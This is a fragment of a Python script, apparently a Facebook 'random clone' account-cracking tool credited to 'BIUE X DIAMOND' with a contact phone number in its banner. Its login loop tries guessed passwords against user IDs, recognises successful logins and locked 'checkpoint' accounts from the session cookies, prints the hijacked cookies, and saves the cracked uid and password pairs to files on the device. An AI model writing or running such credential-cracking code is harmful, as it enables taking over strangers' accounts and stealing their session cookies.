...
GREEN = '\033[1;32m'                                                                                   
==================================================
[] AUTHOR    : BIUE X DIAMOND -JOYðŸ˜ˆ
[] TOOLS     : RANDOM CLONE
[] TYPE      : FREEðŸ
[] FACEBOOK  :  BIUE X DIAMOND  
[] WHATSAPP  : +8801325886805
==================================================""")
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[BIUE X DIAMOND ]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[BIUE X DIAMOND -OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/BIUE X DIAMOND /OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[BIUE X DIAMOND -CP] {cid}|{ps}")
                open('/sdcard/BIUE X DIAMOND -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
